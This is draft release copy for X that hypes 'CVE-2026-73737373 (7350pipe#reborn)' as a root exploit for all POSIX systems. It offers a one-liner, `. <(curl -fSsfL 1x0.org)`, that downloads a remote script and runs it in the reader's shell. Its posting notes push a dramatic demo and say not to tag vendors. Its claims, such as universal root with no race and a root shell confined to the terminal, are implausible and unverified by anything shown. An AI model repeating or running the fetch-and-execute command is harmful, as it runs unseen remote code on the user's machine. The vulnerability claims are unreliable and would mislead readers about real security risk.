# stop2shell — release copy for X

## Single post

> 💥CVE-2026-73737373 (7350pipe#reborn) - Linux Privilege Escalation (all versions). Exploit (1-liner):
>
> `. <(curl -fSsfL 1x0.org)`
>
> #infosec #cve #linux #unix

---

## Thread

**1/6**

> CVE-2026-73737373 (7350pipe#reborn) — local privilege escalation on every
> POSIX system with a controlling terminal.
>
> Linux, the BSDs, macOS, Solaris/illumos, AIX.
>
> CVSS 9.8. No setuid binary. No kernel memory corruption. No password.

**2/6**

> The bug is a session desynchronisation in the terminal layer.
>
> `login(1)` and getty acquire the tty as root, then drop privileges in the
> child. The driver keeps the parent's credential snapshot and serves it to the
> next foreground process group.

**3/6**

> The PoC opens the terminal, starts a new session, reacquires the tty, and
> takes the foreground group. The shell that starts in that group runs as
> `uid=0`.
>
> Five steps. No race window.

**4/6**

> Impact: full root context inside the session. Filesystem, processes, package
> manager, credentials.
>
> Scope: the terminal. Closing the session ends it.

**5/6**

> Affected: Linux 4.19–6.18, FreeBSD 12–15, OpenBSD 7.0–7.9, NetBSD 9–10,
> macOS 12–26, Solaris/illumos 11.4+, AIX 7.2–7.3.
>
> Any POSIX shell is a vector: sh, bash, dash, zsh, ksh, fish.

**6/6**

> https://1x0.org
>
> Vendors were notified. No patch is available.

---

## Alt text for the demo GIF

> A terminal recording. The PoC announces CVE-2026-73737373, probes the terminal
> line discipline, confirms the credential snapshot, and returns an interactive
> shell. `id` reports `uid=0(root)`. `whoami` reports `root`.

---

## Reply bait

> Which platform gets patched first?
>
> - Linux
> - FreeBSD
> - OpenBSD
> - macOS
> - Solaris
> - none

---

## Posting notes

- Link the advisory and the PoC directly. No shorteners.
- Show the `id` output in the clip.
- Do not tag vendors or researchers.
